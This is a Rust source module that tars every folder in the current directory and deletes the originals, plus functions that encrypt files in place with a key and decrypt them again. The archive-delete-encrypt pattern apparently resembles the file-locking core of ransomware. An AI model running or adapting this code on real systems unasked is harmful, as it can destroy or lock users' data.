#![allow(dead_code)]

use crate::encryption;
use std::fs;
use std::fs::metadata;
use std::fs::File;
use std::io::prelude::*;
use std::io::Error;
use std::sync::mpsc;
use std::thread;

// This function will create a tar file from a folder
fn create_tar_gz(folder_name: &str) {
    let mut fname = folder_name.to_string().clone();
    fname.push_str(".tar.gz");
    let tar_gz = File::create(&fname).unwrap();
    let mut tar = tar::Builder::new(tar_gz);
    tar.append_dir_all(folder_name, folder_name).unwrap();
    println!("Tarring {} to {}", folder_name, &fname);
    fs::remove_dir_all(&folder_name).unwrap();
}

// This function will tar the entire folder in the . directory
pub fn tar_all_folders() -> Result<(), Error> {
    let paths = fs::read_dir(".").unwrap();
    let (tx, rx) = mpsc::channel();
    for path in paths {
        match path {
            Ok(path) => match metadata(path.path()) {
                Ok(m) => {
                    if m.is_dir() {
                        let pth = path.path().display().to_string();
                        let tx = tx.clone();
                        thread::spawn(move || {
                            create_tar_gz(&pth);
                            tx.send(0).unwrap();
                        });
                    }
                }
                Err(e) => {
                    return Err(e);
                }
            },
            Err(e) => {
                return Err(e);
            }
        }
    }
    drop(tx);
    for _ in rx {}
    Ok(())
}

pub fn encrypt_file(fname: &str, key: &String) -> Result<(), Error> {
    match fs::read(&fname) {
        Ok(content) => match File::create(&fname) {
            Ok(mut file) => {
                match file.write(encryption::encrypt_to_cipher(&key, &*content).as_bytes()) {
                    Ok(_) => Ok(()),
                    Err(err) => Err(err),
                }
            }
            Err(err) => Err(err),
        },
        Err(err) => Err(err),
    }
}

pub fn decrypt_file(fname: &str, key: &String) -> Result<(), Error> {
    let mut file = match File::open(&fname) {
        Ok(file) => file,
        Err(err) => {
            return Err(err);
        }
    };
    let mut encrypted_content = String::new();
    file.read_to_string(&mut encrypted_content)
        .expect("Cannot read the file");
    match File::create(&fname) {
        Ok(mut out_file) => {
            out_file
                .write(&*encryption::decrypt_to_normal(&key, &encrypted_content))
                .expect("Cannot write to file");
        }
        Err(err) => {
            return Err(err);
        }
    }
    Ok(())
}
